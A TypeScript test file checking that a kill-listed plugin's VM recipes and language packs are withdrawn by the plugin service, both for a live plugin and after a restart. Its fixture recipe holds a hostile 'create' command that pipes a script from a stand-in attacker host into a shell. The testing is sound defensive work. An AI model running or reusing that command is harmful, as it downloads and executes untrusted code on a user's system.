import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { fingerprintPluginConsent } from '../../shared/plugins/plugin-consent-fingerprint'
import { pluginManifestSchema, type PluginManifest } from '../../shared/plugins/plugin-manifest'
import { getApprovedPluginVmRecipes } from './plugin-approved-vm-recipes'
import { PluginService } from './plugin-service'
import { hashPluginTree } from './plugin-content-hash'

/** A kill-listed plugin's declarative content must stop reaching the runtime:
 *  VM recipe `create` strings are executed through spawn(..., { shell: true }). */

const roots: string[] = []
const services: PluginService[] = []
const pluginKey = 'orca-samples.recipes'

function contentManifest(): PluginManifest {
  return pluginManifestSchema.parse({
    manifestVersion: 1,
    id: 'recipes',
    publisher: 'orca-samples',
    name: 'Recipes',
    version: '1.0.0',
    engines: { orca: '>=1.0.0' },
    pluginApi: 1,
    contributes: {
      languagePacks: [{ locale: 'es', path: 'locales/es.json' }],
      vmRecipes: [{ path: 'recipes/vm.json' }]
    },
    capabilities: []
  })
}

async function pluginRoot(): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'orca-plugin-kill-content-'))
  roots.push(root)
  await Promise.all([mkdir(join(root, 'locales')), mkdir(join(root, 'recipes'))])
  await Promise.all([
    writeFile(join(root, 'orca-plugin.json'), JSON.stringify(contentManifest())),
    writeFile(join(root, 'locales', 'es.json'), JSON.stringify({ settings: 'Ajustes' })),
    writeFile(
      join(root, 'recipes', 'vm.json'),
      JSON.stringify({
        schemaVersion: 1,
        id: 'killed-recipe',
        name: 'Killed Recipe',
        create: 'curl https://attacker.example/payload.sh | sh'
      })
    )
  ])
  return root
}

async function createService(root: string, isKilled: () => boolean): Promise<PluginService> {
  const content = await hashPluginTree(root)
  if (!content.ok) {
    throw new Error(content.error)
  }
  const service = new PluginService({
    userDataPath: root,
    hostVersion: '1.4.0',
    isPluginSystemEnabled: () => true,
    getDisabledPlugins: () => [],
    getPluginConsents: () => ({
      [pluginKey]: fingerprintPluginConsent(contentManifest(), content.hash)
    }),
    getDevPluginPaths: () => [root],
    getPluginKillListEntry: (key) =>
      isKilled() && key === pluginKey ? { pluginKey, reason: 'Malware advisory' } : null
  })
  services.push(service)
  return service
}

afterEach(async () => {
  await Promise.all(services.splice(0).map((service) => service.dispose()))
  await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })))
})

describe('kill-list revocation of declarative plugin content', () => {
  it('withdraws VM recipes and language packs when a live plugin is killed', async () => {
    const root = await pluginRoot()
    let killed = false
    const service = await createService(root, () => killed)
    await service.initialize()
    expect(await getApprovedPluginVmRecipes(service)).toHaveLength(1)

    killed = true
    await service.reconcileActivationState()

    expect(await getApprovedPluginVmRecipes(service)).toEqual([])
    expect(service.contentPacks.languagePacks.list()).toEqual([])
  })

  it('never publishes killed content after a restart discovers the plugin', async () => {
    const root = await pluginRoot()
    const service = await createService(root, () => true)

    await service.initialize()

    expect(await getApprovedPluginVmRecipes(service)).toEqual([])
    expect(service.contentPacks.languagePacks.list()).toEqual([])
  })
})
